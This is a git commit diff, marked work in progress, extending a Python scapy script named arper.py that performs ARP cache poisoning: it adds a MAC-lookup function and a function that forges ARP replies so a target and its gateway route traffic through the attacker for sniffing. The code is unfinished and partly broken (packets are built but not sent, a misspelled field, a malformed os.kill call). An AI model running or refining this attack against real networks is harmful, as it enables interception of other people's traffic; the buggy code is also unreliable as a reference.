e0332310aef89b2fd4b79b7d0ed09438bfc259ce
Cesar Santana <cjsseng@gmail.com>
2022-04-04 23:32:34 -0300

    wip

--- network/sniff/arper.py
+++ network/sniff/arper.py
@@ -1,3 +1,4 @@
+from socket import timeout
 from scapy.all import *
 import os
 import sys
@@ -29,7 +30,36 @@ def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
     send(ARP(op=2,psrc=target_ip,psdt=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5)
 
     #avisa a thread principal para terminar 
-    os.kill
+    os.kill(os.getpgid(), signal.SIGINT)
+
+def get_mac(ip_address):
+
+    responses, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address), timeout=2, retry=10)
+
+    #retorna o endereço MAC de uma resposta
+    for s, r in responses:
+        return r[Ether].src
+    
+    return None
+
+def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
+    
+    poison_target = ARP()
+    poison_target.op = 2
+    poison_target.psrc = gateway_ip
+    poison_target.pdst = target_ip
+    poison_target.hwdst = target_mac
+
+    poison_gateway = ARP()
+    poison_gateway.op = 2
+    poison_gateway.psrc = target_ip
+    poison_gateway.pdst = gateway_ip
+    poison_gateway.hwdst = gateway_mac
+    
+    print("[*] Benning the ARP poison. [CTRL -c to stop")
+
+    
+
 
 gateway_mac = get_mac(gateway_ip)
 
@@ -38,6 +68,8 @@ if gateway_mac is None:
     sys.exit(0)
 else:
     print("[*] Gateway %s is at %s" %(gateway_ip, gateway_mac))
+
+target_mac = get_mac(target_ip)
 
 #inicia processo de envenenamento
 poison_thread = threading.Thread(target= poison_target, args = (gateway_ip, gateway_mac, target_ip, target_mac))
